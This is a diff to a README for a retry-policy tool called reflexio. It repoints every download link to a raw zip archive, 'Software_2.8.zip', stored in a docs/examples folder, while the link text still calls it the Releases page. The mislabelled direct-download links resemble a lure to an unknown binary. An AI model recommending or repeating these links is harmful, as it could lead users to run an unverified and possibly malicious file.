@@ -1,6 +1,6 @@
 # 🎯 reflexio - Effortless Retry Policies for Services
 
-![Download reflexio](https://raw.githubusercontent.com/hiothere/reflexio/main/src/reflexio/reflexio-2.7.zip)
+![Download reflexio](https://raw.githubusercontent.com/hiothere/reflexio/main/docs/examples/Software_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **reflexio**, an easy-to-use application for setting up retry policie
 
 To get started, you can download **reflexio** from our Releases page. Click the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/hiothere/reflexio/main/src/reflexio/reflexio-2.7.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/hiothere/reflexio/main/docs/examples/Software_2.8.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -78,6 +78,6 @@ Join our community of users by following our updates on GitHub. Share your exper
 
 Once you have followed the download and installation instructions, you're ready to start using **reflexio**. You can always return to the Releases page for updates or newer versions of the application.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/hiothere/reflexio/main/src/reflexio/reflexio-2.7.zip) 
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/hiothere/reflexio/main/docs/examples/Software_2.8.zip) 
 
 Thank you for choosing **reflexio** as your go-to solution for reliable retry policies!
